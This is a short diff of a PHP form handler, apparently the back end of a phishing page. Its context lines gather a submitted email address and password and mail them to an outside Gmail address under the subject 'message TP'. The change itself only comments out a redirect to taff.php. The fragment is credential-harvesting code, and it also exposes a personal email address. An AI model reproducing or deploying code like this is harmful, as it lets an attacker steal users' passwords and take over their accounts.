@@ -19,7 +19,7 @@ if($action == 'mailer')
     $message .= 'Email:' . $EM . PHP_EOL;
     $message .= 'Mot de passe:' . PHP_EOL . $mdp;
     mail('crazyfonz72@gmail.com' ,'message TP',$message);
-    header('Location: taff.php');
+    //header('Location: taff.php');
 }
 
 else
